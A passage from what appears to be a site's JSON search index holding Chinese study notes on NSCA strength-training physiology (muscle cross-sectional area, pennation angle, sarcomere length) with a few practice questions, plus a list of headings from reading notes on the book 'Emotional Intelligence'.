\uff1a\u5982\u679c\u4e24\u540d\u8fd0\u52a8\u5458\u80b1\u4e8c\u5934\u808c\u7684\u5468\u957f\u76f8\u540c\uff0c\u90a3\u4e48\u4ed6\u4eec\u7684\u808c\u8089\u6a2a\u622a\u9762\u79ef\u4e5f\u5927\u81f4\u76f8\u540c\uff0c\u5c3d\u7ba1\u4ed6\u4eec\u7684\u8eab\u9ad8\u548c\u4f53\u91cd\u4e0d\u540c\u3002 \u76f8\u540c\u529b\u91cf \uff1a\u5728\u5176\u4ed6\u6761\u4ef6\u76f8\u540c\u7684\u60c5\u51b5\u4e0b\uff0c\u6a2a\u622a\u9762\u79ef\u76f8\u540c\u7684\u808c\u8089\u4f1a\u4ea7\u751f\u76f8\u540c\u7684\u529b\u91cf\u3002 \u8eab\u9ad8\u548c\u4f53\u91cd\u5bf9\u8fd0\u52a8\u8868\u73b0\u7684\u5f71\u54cd \u8f83\u9ad8\u7684\u8fd0\u52a8\u5458 \uff1a\u867d\u7136\u8f83\u9ad8\u7684\u8fd0\u52a8\u5458\u808c\u8089\u4f53\u79ef\u66f4\u5927\uff08\u56e0\u4e3a\u808c\u8089\u8f83\u957f\uff09\uff0c\u4f46\u7531\u4e8e\u4f53\u91cd\u5927\uff0c\u5728\u9700\u8981\u514b\u670d\u81ea\u8eab\u91cd\u529b\u6216\u52a0\u901f\u8eab\u4f53\u65f6\u4f1a\u5904\u4e8e\u52a3\u52bf\u3002 \u76f8\u5bf9\u52a3\u52bf \uff1a\u8f83\u9ad8\u3001\u8f83\u91cd\u7684\u8fd0\u52a8\u5458\u5728\u8857\u5934\u5065\u8eab\u548c\u4f53\u64cd\u7b49\u9700\u8981\u8f83\u9ad8\u76f8\u5bf9\u529b\u91cf\u7684\u8fd0\u52a8\u4e2d\uff0c\u8868\u73b0\u53ef\u80fd\u4e0d\u5982\u8f83\u77ee\u3001\u8f83\u8f7b\u7684\u8fd0\u52a8\u5458\u3002 \u4f53\u64cd\u8fd0\u52a8\u5458 \uff1a\u8fd9\u89e3\u91ca\u4e86\u4e3a\u4ec0\u4e48\u5927\u591a\u6570\u4f18\u79c0\u4f53\u64cd\u8fd0\u52a8\u5458\u7684\u8eab\u9ad8\u901a\u5e38\u8f83\u77ee\uff0c\u4ed6\u4eec\u80fd\u591f\u66f4\u6709\u6548\u5730\u5229\u7528\u76f8\u5bf9\u529b\u91cf\u8fdb\u884c\u9ad8\u96be\u5ea6\u52a8\u4f5c\u3002 \u6297\u963b\u8bad\u7ec3\u7684\u6548\u679c \u589e\u52a0\u529b\u91cf\u548c\u6a2a\u622a\u9762\u79ef \uff1a\u6297\u963b\u8bad\u7ec3\u4e0d\u4ec5\u80fd\u589e\u52a0\u808c\u8089\u7684\u529b\u91cf\uff0c\u8fd8\u80fd\u589e\u52a0\u808c\u8089\u7684\u6a2a\u622a\u9762\u79ef\uff0c\u4ece\u800c\u63d0\u9ad8\u6574\u4f53\u8fd0\u52a8\u8868\u73b0\u3002 \u603b\u7ed3\u6765\u8bf4\uff0c\u808c\u8089\u529b\u91cf\u4e3b\u8981\u53d6\u51b3\u4e8e\u5176\u6a2a\u622a\u9762\u79ef\uff0c\u800c\u8eab\u9ad8\u548c\u4f53\u91cd\u5219\u5f71\u54cd\u8fd0\u52a8\u5458\u5728\u7279\u5b9a\u8fd0\u52a8\u4e2d\u7684\u8868\u73b0\u3002\u6297\u963b\u8bad\u7ec3\u662f\u63d0\u9ad8\u808c\u8089\u529b\u91cf\u548c\u6a2a\u622a\u9762\u79ef\u7684\u6709\u6548\u65b9\u6cd5\uff0c\u6709\u52a9\u4e8e\u63d0\u5347\u6574\u4f53\u8fd0\u52a8\u80fd\u529b\u3002","title":"\u808c\u8089\u6a2a\u622a\u9762\u79ef"},{"location":"soft/NSCA/#_62","text":"\u808c\u8089\u7684\u6700\u5927\u6536\u7f29\u529b \u529b\u7684\u8303\u56f4 \uff1a\u7814\u7a76\u8868\u660e\uff0c\u808c\u8089\u5728\u6700\u5927\u6536\u7f29\u65f6\u80fd\u591f\u5728\u6a2a\u622a\u9762\u4e0a\u4ea7\u751f23~145psi\uff0816~100N/cm\u00b2\uff09\u7684\u529b\u3002 \u5f71\u54cd\u56e0\u7d20 \uff1a\u8fd9\u4e2a\u5e7f\u6cdb\u7684\u529b\u8303\u56f4\u90e8\u5206\u7531\u808c\u5c0f\u8282\u76f8\u5bf9\u4e8e\u808c\u8089\u957f\u8f74\u7684\u6392\u5217\u65b9\u5f0f\u9020\u6210\u3002 \u7fbd\u72b6\u808c\u7684\u7ed3\u6784 \u5b9a\u4e49 \uff1a\u7fbd\u72b6\u808c\u7684\u808c\u7ea4\u7ef4\u76f8\u5bf9\u4e8e\u808c\u8171\u503e\u659c\u6392\u5217\uff0c\u5f62\u6210\u7fbd\u6bdb\u72b6\u7684\u7ed3\u6784\u3002 \u7fbd\u72b6\u89d2 \uff1a\u808c\u7ea4\u7ef4\u4e0e\u808c\u8089\u8d77\u6b62\u70b9\u8fde\u7ebf\u4e4b\u95f4\u7684\u5939\u89d2\u3002\u7fbd\u72b6\u89d2\u4e3a0\u65f6\uff0c\u808c\u8089\u4e0d\u662f\u7fbd\u72b6\u808c\u3002 \u5e38\u89c1\u89d2\u5ea6 \uff1a\u4eba\u4f53\u5927\u591a\u6570\u7fbd\u72b6\u808c\u7684\u7fbd\u72b6\u89d2\u4e0d\u8d85\u8fc715\u00b0\u3002\u7fbd\u72b6\u89d2\u4f1a\u5728\u808c\u8089\u6536\u7f29\u65f6\u53d8\u5927\u3002 \u7fbd\u72b6\u89d2\u5bf9\u808c\u8089\u529b\u91cf\u548c\u901f\u5ea6\u7684\u5f71\u54cd \u529b\u91cf\u548c\u6536\u7f29\u901f\u5ea6 \uff1a \u7fbd\u72b6\u89d2\u5927\u7684\u808c\u8089 \uff1a\u6709\u66f4\u591a\u5e73\u884c\u6392\u5217\u7684\u808c\u5c0f\u8282\uff0c\u4ea7\u751f\u66f4\u5927\u7684\u529b\u91cf\uff0c\u4f46\u6700\u5927\u6536\u7f29\u901f\u5ea6\u8f83\u4f4e\u3002 \u7fbd\u72b6\u89d2\u5c0f\u7684\u808c\u8089 \uff1a\u6709\u66f4\u591a\u4e32\u8054\u7684\u808c\u5c0f\u8282\uff0c\u4ea7\u751f\u8f83\u9ad8\u7684\u6700\u5927\u6536\u7f29\u901f\u5ea6\uff0c\u4f46\u529b\u91cf\u8f83\u5c0f\u3002 \u5f71\u54cd\u7c7b\u578b \uff1a\u7fbd\u72b6\u89d2\u5f71\u54cd\u808c\u8089\u4ea7\u751f\u79bb\u5fc3\u3001\u7b49\u957f\u6216\u4f4e\u901f\u5411\u5fc3\u529b\u91cf\u7684\u80fd\u529b\u3002 \u7fbd\u72b6\u89d2\u7684\u53ef\u5851\u6027 \u9057\u4f20\u548c\u8bad\u7ec3 \uff1a\u7fbd\u72b6\u89d2\u53d7\u9057\u4f20\u56e0\u7d20\u5f71\u54cd\uff0c\u4f46\u53ef\u4ee5\u901a\u8fc7\u8bad\u7ec3\u6539\u53d8\u3002\u8fd9\u89e3\u91ca\u4e86\u4e3a\u4ec0\u4e48\u808c\u8089\u4f53\u79ef\u76f8\u4f3c\u7684\u4eba\u8868\u73b0\u51fa\u4e0d\u540c\u7684\u529b\u91cf\u548c\u901f\u5ea6\u3002 \u808c\u8089\u7684\u7fbd\u72b6\u7ed3\u6784\u53ca\u5176\u7fbd\u72b6\u89d2\u5bf9\u808c\u8089\u7684\u529b\u91cf\u548c\u901f\u5ea6\u6709\u91cd\u8981\u5f71\u54cd\u3002\u7fbd\u72b6\u89d2\u5927\u7684\u808c\u8089\u66f4\u64c5\u957f\u4ea7\u751f\u529b\u91cf\uff0c\u800c\u7fbd\u72b6\u89d2\u5c0f\u7684\u808c\u8089\u66f4\u64c5\u957f\u4ea7\u751f\u901f\u5ea6\u3002\u5c3d\u7ba1\u7fbd\u72b6\u89d2\u53d7\u9057\u4f20\u56e0\u7d20\u5f71\u54cd\uff0c\u4f46\u53ef\u4ee5\u901a\u8fc7\u8bad\u7ec3\u8fdb\u884c\u8c03\u6574\uff0c\u4ece\u800c\u4f18\u5316\u808c\u8089\u7684\u529f\u80fd\u548c\u8868\u73b0\u3002","title":"\u808c\u7ea4\u7ef4\u6392\u5217"},{"location":"soft/NSCA/#_63","text":"\u5f53\u808c\u8089\u5904\u4e8e\u9759\u606f\u957f\u5ea6\u65f6\uff0c\u808c\u52a8\u86cb\u767d\u4e1d\u548c\u808c\u7403\u86cb\u767d\u4e1d\u9760\u8fd1\u5f7c\u6b64\uff0c\u4f7f\u5176\u5177\u6709\u6700\u5927\u6570\u91cf\u7684\u53ef\u7ed3\u5408\u7684\u6a2a\u6865\u4f4d\u70b9(\u56fe2.12)\u3002\u56e0\u6b64\uff0c\u808c\u8089\u53ef\u4ee5\u5728\u5176\u9759\u606f\u957f\u5ea6\u65f6\u4ea7\u751f\u6700\u5927\u7684\u529b\u3002\u5f53\u808c\u8089\u88ab\u5927\u5e45\u62c9\u4f38\uff0c\u957f\u5ea6\u8d85\u8fc7\u5176\u9759\u606f\u957f\u5ea6\u65f6\uff0c\u808c\u52a8\u86cb\u767d\u4e1d\u548c\u808c\u7403\u86cb\u767d\u4e1d\u5f7c\u6b64\u91cd\u53e0\u7684\u90e8\u4f4d\u51cf\u5c11\u3002\u56e0\u4e3a\u6f5c\u5728\u7684\u6a2a\u6865\u4f4d\u70b9\u51cf\u5c11\uff0c\u6240\u4ee5\u808c\u8089\u4e0d\u80fd\u4ea7\u751f\u4e0e\u9759\u606f\u957f\u5ea6\u76f8\u540c\u7684\u529b\u3002\u5f53\u808c\u8089\u6536\u7f29\u8fc7\u591a\uff0c\u957f\u5ea6\u8fdc\u5c0f\u4e8e\u5176\u9759\u606f\u957f\u5ea6\u65f6\uff0c\u808c\u52a8\u86cb\u767d\u4e1d\u91cd\u53e0\uff0c\u5e76\u4e14\u6a2a\u6865\u4f4d\u70b9\u7684\u6570\u91cf\u51cf\u5c11\uff0c\u4ece\u800c\u964d\u4f4e\u4e86\u4ea7\u751f\u529b\u7684\u80fd\u529b\u3002 \u95ee\u9898\uff1a\u5728\u819d\u76d6\u5f2f\u66f2\u7684\u817f\u5f2f\u4e3e\u8fd0\u52a8\u4e2d\uff0c\u4e0b\u9762\u54ea\u4e2a\u7ed3\u6784\u5185\u7684\u80a1\u4e8c\u5934\u808c\u808c\u8282\u957f\u5ea6\u7684\u51cf\u5c11\u5e76\u6700\u7ec8\u6d88\u5931\u4e86? A\u3001A\u5e26 B\u3001H\u533a C\u3001l\u5e26 \u8fd9\u9053\u9898\u5e94\u8be5\u9009\u54ea\u4e2a\uff1f \u95ee\u9898\uff1a\u529b\u81c2\u662f\u529b\u7684\u4f5c\u7528\u7ebf\u5230\u652f\u70b9\u7684\u5782\u76f4\u8ddd\u79bb\uff0c\u4e3a\u4ec0\u4e48\u4e00\u4e2a\u77ed\u529b\u81c2\u5bf9\u5927\u591a\u6570\u5173\u8282\u5468\u56f4\u7684\u808c\u8089\u7ec4\u7ec7\u6709\u597d\u5904? A\u3001\u6240\u4ee5\u673a\u68b0\u6548\u76ca\u7684\u6bd4\u7387\u9ad8 B\u3001\u5b83\u5141\u8bb8\u52a8\u4f5c\u66f4\u5bb9\u6613\u5b8c\u6210 C\u3001\u6240\u4ee5\u808c\u8089\u66f4\u52a0\u52aa\u529b\u5730\u5de5\u4f5c \u8fd9\u9053\u9898\u5e94\u8be5\u9009\u54ea\u4e2a\uff1f \u95ee\u9898\uff1a\u5173\u4e8e\u201c\u6211\u7684\u76d8\u4e2d\u9910\u201d\uff0c\u4ee5\u4e0b\u8bed\u53e5\u4e2d\u6709\u54ea\u4e9b\u662f\u9519\u8bef\u7684? A\u3001\u6392\u9664\u6574\u4e2a\u98df\u7269\u7ec4\u7684\u4eba\u5e94\u8be5\u4e0e\u8425\u517b\u5e08\u5408\u4f5c\u5bfb\u627e\u5408\u9002\u7684\u66ff\u4ee3\u54c1\u4ee5\u6ee1\u8db3\u8425\u517b\u9700\u6c42 B\u3001\u6211\u7684\u76d8\u4e2d\u9910\u4e2d\u663e\u793a\u7684\u98df\u7269\u7ec4\u5305\u62ec\u8c37\u7269\uff0c\u852c\u83dc\uff0c\u6c34\u679c\uff0c\u86cb\u767d\u8d28\u98df\u7269\u548c\u4e73\u5236\u54c1 C\u3001\u6211\u7684\u76d8\u4e2d\u9910\u5305\u62ec\u4f5c\u4e3a\u98df\u7269\u7ec4\u7684\u6cb9 \u8fd9\u9053\u9898\u5e94\u8be5\u9009\u54ea\u4e2a\uff1f \u95ee\u9898\uff1a\u4e00\u540d\u5973\u5b50\u5927\u5b66\u751f\u7bee\u7403\u524d\u950b\u6b63\u5904\u4e8e\u8d5b\u5b63\u3002\u5979\u5bf9\u81ea\u5df1\u7684\u4f53\u91cd\u6bd4\u8f83\u6ee1\u610f\uff0c\u4f46\u60f3\u77e5\u9053\u5979\u7684\u996e\u98df\u662f\u5426\u9002\u5408\u5979\u7684\u9700\u8981\u3002\u5979\u6bcf\u5929\u7684\u5361\u8def\u91cc\u6444\u5165\u91cf\u5305\u62ec\u4ee5\u4e0b\u5185\u5bb9: \u78b3\u6c34\u5316\u5408\u7269\uff1a1500 kcals \u86cb\u767d\u8d28\uff1a500 kcals \u8102\u80aa\uff1a350 kcals \u5173\u4e8e\u4e09\u5927\u8425\u517b\u7d20\u7684\u914d\u6bd4\u8c03\u6574\uff0c\u4e0b\u5217\u54ea\u9879\u5efa\u8bae\u6700\u6070\u5f53? \u78b3\u6c34\u5316\u5408\u7269 \u86cb\u767d\u8d28 \u8102\u80aa A\u3001\u4fdd\u6301 \u51cf\u5c11 \u589e\u52a0 B\u3001\u589e\u52a0 \u589e\u52a0 \u4fdd\u6301 C\u3001\u51cf\u5c11 \u4fdd\u6301 \u51cf\u5c11 \u8fd9\u9053\u9898\u5e94\u8be5\u9009\u54ea\u4e2a\uff1f","title":"\u808c\u8089\u957f\u5ea6"},{"location":"soft/%E3%80%8A%E6%83%85%E5%95%86%E3%80%8B%E7%AC%94%E8%AE%B0/","text":"\u4eba\u7684\u56db\u79cd\u667a\u80fd \u7231\u60c5\u7684\u5173\u952e\u662f\u60c5\u5546 \u7231\u60c5\u60c5\u5546\u8d77\u6e90\u4e8e\u513f\u7ae5\u671f \u516b\u9762\u73b2\u73d1\u7684\u4eba\u9700\u8981\u53d6\u5f97\u5e73\u8861\u81ea\u8eab\u7684\u611f\u53d7 \u628a\u70e6\u607c\u7684\u60f3\u6cd5\u8bf4\u51fa\u6765\uff0c\u6709\u52a9\u4e8e\u51cf\u8f7b\u538b\u529b \u6446\u8131\u6291\u90c1\u7684\u9014\u5f84 \u5e2e\u52a9\u522b\u4eba\u53ef\u4ee5\u6446\u8131\u6291\u90c1 \u5e2e\u52a9\u8c03\u8282\u4e0d\u5b89\u7684\u60c5\u7eea\u53ef\u4ee5\u9884\u9632\u75be\u75c5 \u62b1\u6028\u548c\u4eba\u8eab\u653b\u51fb\u7684\u533a\u522b \u60b2\u4f24\u4f1a\u4f7f\u5fc3\u529b\u4e0b\u964d\uff0c\u4f1a\u5931\u53bb\u5bf9\u5f88\u591a\u4e8b\u60c5\u7684\u5174\u8da3 \u60b2\u4f24\u79ef\u6781\u7684\u4e00\u9762 \u5982\u4f55\u6b63\u786e\u5904\u7406\u88ab\u6279\u8bc4 \u66b4\u529b\u884c\u4e3a\u4f1a\u4f7f\u4eba\u4e0d\u5728\u503c\u5f97\u4fe1\u4efb \u6d88\u9664\u6124\u6012\u7684\u4e00\u79cd\u65b9\u6cd5\u5c31\u662f\u4e0d\u518d\u60f3\u300e\u6124\u6012\u7684\u539f\u56e0\u300f \u4e0d\u5584\u4e8e\u5904\u7406\u5b69\u5b50\u7684\u60c5\u7eea\u7684\u4e09\u79cd\u60c5\u51b5 \u901a\u8fc7\u4f7f\u611f\u5b98\u6109\u60a6\u53ef\u4ee5\u6d88\u9664\u6109\u60a6 \u521b\u4f24\u7684\u5e94\u6fc0 \u521b\u4f24\u7684\u5e94\u6fc0\u53ef\u4ee5\u6cbb\u7597 \u521b\u4f24\u540e\u679c \u521b\u4f24\u6062\u590d\u7684\u4e09\u4e2a\u9636\u6bb5 \u9519\u8bef\u7684\u6279\u8bc4\u65b9\u5f0f\uff0c\u6279\u8bc4\u4e0d\u5e94\u8be5\u8868\u73b0\u4e3a\u4eba\u8eab\u653b\u51fb \u6253\u626e\u81ea\u5df1\u4e5f\u80fd\u4f7f\u81ea\u5df1\u6446\u8131\u6291\u90c1 \u60c5\u7eea\u4e60\u60ef\u517b\u6210\u7684\u5173\u952e\u65f6\u671f\u662f\u5c11\u5e74\u671f \u5927\u8111\u76ae\u5c42\u5e2e\u52a9\u6446\u8131\u56f0\u6270\u60c5\u7eea \u5927\u8111\u4e00\u751f\u90fd\u662f\u53ef\u5851\u7684 \u5927\u7b11\u53ef\u4ee5\u4f7f\u4eba\u66f4\u52a0\u806a\u660e \u8c03\u8282\u4ed6\u4eba\u7684\u60c5\u7eea\u662f\u5904\u7406\u4eba\u673a\u5173\u7cfb\u7684\u6838\u5fc3 \u5bf9\u5a5a\u59fb\u7684\u5fe0\u544a \u591a\u5f69\u5149\u8c31\u9879\u76ee\u53ef\u4ee5\u9884\u6d4b\u51fa\u5b69\u5b50\u5728\u54ea\u65b9\u9762\u66f4\u52a0\u6709\u5929\u8d4b \u6076\u52a3\u7684\u884c\u4e3a\u66b4\u529b \u4e0b\u5c5e\u7684\u5927\u591a\u6570\u884c\u4e3a\u4e0d\u662f\u7a81\u7136\u51fa\u73b0\u7684 \u5bf9\u6297\u5fe7\u8651\u7684\u65b9\u6cd5\u662f\u8d28\u7591\u5fe7\u8651 \u793e\u4ea4\u7f51\u7edc\u4e2d\u7684\u975e\u6b63\u5f0f\u7f51\u7edc\u7684\u91cd\u8981\u6027 \u6124\u6012\u7684\u60c5\u7eea\u5bf9\u5fc3\u810f\u6700\u4e0d\u597d \u4eba\u9047\u5230\u5371\u9669\u7684\u53cd\u5e94 \u8d1f\u9762\u60c5\u7eea\u5bf9\u8eab\u4f53\u7684\u5f71\u54cd \u6539\u53d8\u504f\u89c1\u6bd4\u6539\u53d8\u4fe1\u5ff5\u8fd8\u96be \u6539\u53d8\u6c14\u8d28 \u9ad8\u6210\u5c31\u8005\u548c\u4f4e\u6210\u5c31\u8005\u82b1\u8d39\u5728\u65e0\u804a\u65f6\u95f4\u76f8\u540c \u9ad8\u60c5\u5546\u7537\u548c\u5973\u533a\u522b \u9ad8\u667a\u5546\u7c7b\u578b \u7ed9\u5a5a\u59fb\u7684\u5efa\u8bae \u8fc7\u5ea6\u538b\u529b\u548c\u7126\u8651\u5bfc\u81f4\u514d\u75ab\u529b\u5730\u4e0b \u8fc7\u591a\u7684\u54ed\u6ce3\u4e0d\u5229\u4e8e\u8fdc\u79bb\u60b2\u4f24 \u5b69\u5b50\u901a\u8fc7\u8bbe\u6cd5\u52a0\u5165\u522b\u7684\u5b69\u5b50\u6b63\u5728\u73a9\u7684\u6e38\u620f\uff0c\u53ef\u4ee5\u953b\u70bc\u9006\u60c5\u5546 \u5b69\u5b50\u5728\u5bb6\u5b66\u4f1a\u6b66\u529b\u7684\u574f\u5904 \u4e0d\u8981\u5bb3\u6015\u6ca1\u6709\u4eba\u5bf9\u81ea\u5df1\u7684\u8bdd\u611f\u5174\u8da3 \u597d\u5fc3\u60c5\u7684\u4fc3\u8fdb\u4f5c\u7528 \u5a5a\u59fb\u51fa\u73b0\u5371\u673a\u7684\u4fe1\u53f7\u662f\u5c16\u9510\u7684\u6279\u8bc4 \u5a5a\u59fb\u4e2d\u5bf9\u7537\u4eba\u7684\u5efa\u8bae \u5a5a\u59fb\u4e2d\u5bf9\u5973\u4eba\u7684\u5efa\u8bae \u5bc2\u5bde\u5371\u5bb3\u5065\u5eb7 \u4e0d\u53d7\u6b22\u8fce\u7684\u5b69\u5b50\u5bb9\u6613\u72af\u7684\u9519\u8bef \u52a0\u5165\u65b0\u56e2\u4f53\u7684\u89c4\u5219 \u5bb6\u5ead\u66b4\u529b\u4fc3\u6b8b\u540c\u7406\u5fc3 \u51cf\u8f7b\u6291\u90c1\u7684\u65b9\u6cd5 \u8fdb\u5165\u6d8c\u6d41\u65f6\uff0c\u4efb\u52a1\u662f\u7a0d\u7a0d\u8d85\u8fc7\u4eba\u7684\u80fd\u529b\u8303\u56f4 \u5f00\u5fc3\u7684\u529b\u91cf \u63a7\u5236\u6124\u6012\u7684\u65b9\u6cd5 \u63a7\u5236\u6124\u6012\u7684\u65b9\u6cd52 \u4e50\u89c2\u7684\u6fc0\u52b1\u4f5c\u7528\u662f\u6700\u660e\u663e\u7684 \u4e50\u89c2\u548c\u5e0c\u671b\u662f\u53ef\u4ee5\u540e\u5929\u5b66\u4e60\u7684 \u7406\u89e3\u53d7\u8650\u513f\u7ae5 \u60c5\u7eea\u5bf9\u5b9d\u5b9d\u7684\u5f71\u54cd1 \u60c5\u7eea\u5bf9\u5b9d\u5b9d\u7684\u5f71\u54cd2 \u514d\u75ab\u7cfb\u7edf\u4e5f\u6709\u5b66\u4e60\u80fd\u529b \u9762\u5bf9\u56f0\u96be\u7684\u65b9\u6cd5 \u660e\u661f\u5de5\u7a0b\u5e08\u7684\u7279\u70b9 \u7537\u4eba\u6bd4\u5973\u4eba\u5728\u5a5a\u59fb\u4e2d\u76f2\u76ee\u4e50\u89c2 \u7537\u4eba\u66f4\u9700\u8981\u5173\u6000 \u5973\u6027\u83b7\u5f97\u60c5\u7eea\u4fe1\u606f\u673a\u4f1a\u8981\u591a\u4e8e\u7537\u5b69 \u7537\u6027\u548c\u5973\u6027\u5bf9\u4e8e\u5b64\u7acb\u7684\u5f71\u54cd \u7537\u6027\u6d88\u9664\u6124\u6012\u7684\u65b9\u6cd5 \u80fd\u5e2e\u52a9\u4ed6\u4eba\u8212\u7f13\u60c5\u7eea\u7684\u4eba\u7279\u522b\u53d7\u6b22\u8fce \u5973\u5b69\u548c\u7537\u5b69\u5728\u56e2\u4f53\u4e2d\u7684\u533a\u522b \u5973\u5b69\u5b50\u66f4\u52a0\u5584\u4e8e\u975e\u8bed\u8a00\u7684\u60c5\u7eea\u8868\u8fbe \u5973\u6027\u53d7\u5230\u7684\u60c5\u7eea\u6ce2\u52a8\u5c0f \u914d\u5076\u4e4b\u95f4\u751f\u7406\u6c34\u5e73\u540c\u6b65\u9ad8\uff0c\u540c\u7406\u5fc3\u51c6\u786e\u5ea6\u6700\u9ad8 \u6279\u8bc4\u4e0d\u5e94\u8be5\u5e26\u6709\u4eba\u683c\u65b9\u9762\u7684\u653b\u51fb \u6279\u8bc4\u7684\u5efa\u8bae1 \u6279\u8bc4\u7684\u5efa\u8bae2 \u504f\u89c1\u7684\u6839\u6e90 \u4e03\u9879\u80fd\u529b1 \u4e03\u9879\u80fd\u529b2 \u4f01\u4e1a\u6279\u8bc4\u4e5f\u4f1a\u9020\u6210\u60c5\u7eea\u6cdb\u6ee5 \u6c14\u8d28\u53ef\u4ee5\u6539\u53d8 \u9752\u5c11\u5e74\u7684\u95ee\u9898 \u8f7b\u8511\u7684\u4e25\u91cd\u540e\u679c \u60c5\u5546\u5305\u62ec\u54ea\u4e9b \u60c5\u5546\u7684\u91cd\u8981\u6027 \u60c5\u5546\u548c\u667a\u5546\u7684\u5173\u7cfb \u60c5\u7eea\u7684\u63a7\u5236 \u60c5\u7eea\u7684\u4f5c\u7528 \u60c5\u7eea\u8c03\u8282\u514d\u75ab\u7cfb\u7edf \u60c5\u7eea\u6cdb\u6ee5 \u60c5\u7eea\u6cdb\u6ee5\u628a\u6240\u6709\u7684\u53ef\u80fd\u90fd\u770b\u7684\u65e0\u6cd5\u4fee\u590d \u60c5\u7eea\u6cdb\u6ee5\u7684\u7ed3\u679c \u60c5\u7eea\u611f\u67d3 \u60c5\u7eea\u5171\u821e \u60c5\u7eea\u548c\u601d\u8003\u7684\u5173\u7cfb \u60c5\u7eea\u548c\u601d\u8003\u7684\u5173\u7cfb2 \u60c5\u7eea\u7a7a\u767d \u60c5\u7eea\u76f2\u662f\u6240\u6709\u513f\u7ae5\u5171\u540c\u7684\u96be\u5173 \u60c5\u7eea\u7834\u574f\u5fc3\u667a \u60c5\u7eea\u5931\u63a7\u7684\u539f\u56e0 \u60c5\u7eea\u5931\u63a7\u6d89\u53ca\u7684\u4e24\u79cd\u673a\u5236 \u60c5\u7eea\u662f\u53ef\u4ee5\u4f20\u67d3\u7684 \u60c5\u7eea\u518d\u5b66\u4e60 \u5fc3\u7406\u6cbb\u7597\u4e0e\u836f\u7269\u6cbb\u7597\u6548\u679c\u4e00\u6837 \u60c5\u7eea\u667a\u529b\u5904\u4e8e\u4e3b\u5bfc\u5730\u4f4d \u60c5\u7eea\u667a\u529b\u7684\u4e94\u79cd\u9886\u57df \u60c5\u7eea\u667a\u529b\u5728\u7ae5\u5e74\u671f\u6709\u5173\u952e\u7684\u65f6\u671f \u60c5\u7eea\u95ee\u9898\u7684\u8eaf\u4f53\u5316 \u7fa4\u4f53\u667a\u529b \u70ed\u60c5\u81ea\u4fe1\u5bf9\u63d0\u9ad8\u6210\u5c31\u6709\u5f15\u5bfc\u4f5c\u7528 \u4eba\u7684\u7279\u8d28\u90fd\u53ef\u4ee5\u6539\u53d8 \u4eba\u9645\u8054\u7cfb\u548c\u793e\u4f1a\u5206\u6790 \u4eba\u9645\u667a\u80fd\u7684\u56db\u79cd\u80fd\u529b \u4eba\u4f53\u7684\u514d\u75ab\u7cfb\u7edf\u50cf\u4eba\u8111\u4e00\u6837\u5177\u6709\u5b66\u4e60\u80fd\u529b \u4eba\u6709\u4e09\u5927\u8d1f\u9762\u60c5\u7eea \u4efb\u610f\u6253\u5b69\u5b50\u4f1a\u504f\u6267\u548c\u597d\u6597 \u5982\u679c\u5fc3\u7406\u9700\u6c42\u4e0e\u5176\u533b\u7597\u9700\u6c42\u534f\u8c03\u4e00\u81f4 \u8f6f\u7cd6\u5b9e\u9a8c \u4e09\u79cd\u7f51\u7edc \u793e\u4ea4\u7ade\u4e89\u529b \u793e\u4ea4\u6709\u5229\u4e8e\u6446\u8131\u60b2\u4f24 \u6292\u60c5\u969c\u788d \u6292\u60c5\u969c\u788d2 \u6292\u60c5\u969c\u788d3 \u968f\u673a\u5e94\u53d8\u800c\u53c8\u5fe0\u4e8e\u81ea\u6211\u5185\u5fc3\u7684\u611f\u53d7 \u63d0\u9ad8\u60c5\u7eea\u6446\u8131\u7684\u9014\u5f84 \u540c\u7406\u5fc3\u7684\u7f3a\u5931\u4f1a\u5e26\u5e26\u76f8\u4f20 \u7ae5\u5e74\u6bd4\u8f83\u91cd\u8981 \u56e2\u961f\u6700\u4f18\u5316\u662f\u4fdd\u6301\u56e2\u961f\u5185\u90e8\u548c\u8c10 \u5371\u673a\u59cb\u4e8e\u60c5\u7eea\u6cdb\u6ee5 \u65e0\u52a9\u611f \u5e0c\u671b\u80fd\u51cf\u5c11\u7126\u8651 \u73b0\u5728\u5bfc\u81f4\u60c5\u7eea\u76f2\u7684\u539f\u56e0 \u76f8\u6bd4\u4e4b\u4e0b\u4f7f\u81ea\u5df1\u4e0d\u90a3\u4e48\u6291\u90c1 \u76f8\u4fe1\u4e8b\u60c5\u4f1a\u597d\u8d77\u6765\u7684 \u4eab\u53d7\u5b66\u4e60\u7684\u7eaf\u7cb9\u4e50\u8da3\u7684\u4eba\u5bb9\u6613\u8fdb\u5165\u6d8c\u6d41 \u6d88\u9664\u6124\u6012\u7684\u4e24\u79cd\u65b9\u6cd51 \u6d88\u9664\u6124\u6012\u7684\u4e24\u79cd\u65b9\u6cd52 \u6d88\u9664\u6124\u6012\u7684\u4e24\u79cd\u65b9\u6cd53 \u6d88\u9664\u6124\u6012\u7684\u603b\u7ed3\u4e09\u79cd \u6d88\u6781\u9003\u8dd1\u7684\u53cd\u5e94\u5e26\u6765\u7684\u540e\u679c \u5c0f\u9738\u738b\u662f\u600e\u4e48\u5f62\u6210\u7684 \u5fc3\u60c5\u597d\u4f1a\u4ea7\u751f\u6b63\u786e\u7684\u51b3\u7b56 \u5ba3\u6cc4\u6012\u706b\u5bf9\u5e73\u606f\u6012\u706b\u6ca1\u6709\u4efb\u4f55\u597d\u5904 \u538b\u6291\u8005 \u4e25\u683c\u5bf9\u5e26\u5b69\u5b50 \u4e25\u91cd\u6291\u90c1\u7684\u89e3\u9664\u65b9\u6cd5 \u6291\u90c1\u7684\u539f\u56e02 \u6291\u90c1\u8005\u4f1a\u9009\u62e9\u66f4\u52a0\u6291\u90c1\u7684\u6d3b\u52a8 \u6291\u90c1\u75c7\u539f\u56e0 \u6291\u90c1\u4e2d\u6c89\u601d\u4f1a\u4f7f\u81ea\u5df1\u66f4\u52a0\u6291\u90c1 \u5e94\u5f53\u5c3d\u65e9\u505c\u6b62\u6b67\u89c6\u884c\u4e3a \u6d8c\u6d41\u4fc3\u4f7f\u628a\u4eba\u4eec\u81ea\u8eab\u6f5c\u80fd\u53d1\u6325\u5230\u6781\u81f4 \u6d8c\u6d41\u662f\u65b0\u7684\u6559\u80b2\u6a21\u5f0f \u5fe7\u8651\u7684\u4e24\u79cd\u8868\u73b0\u5f62\u5f0f \u5fe7\u8651\u8fc7\u591a\u4e0d\u662f\u597d\u4e8b \u5fe7\u8651\u548c\u7126\u8651\u5bf9\u6240\u6709\u5fc3\u7406\u6d3b\u52a8\u90fd\u6709\u7834\u574f \u7531\u4e8e\u60c5\u7eea\u4f1a\u4f20\u67d3\uff0c\u6240\u4ee5\u4e0d\u8981\u53d7\u5230\u4e0d\u597d\u7684\u60c5\u7eea\u5f71\u54cd 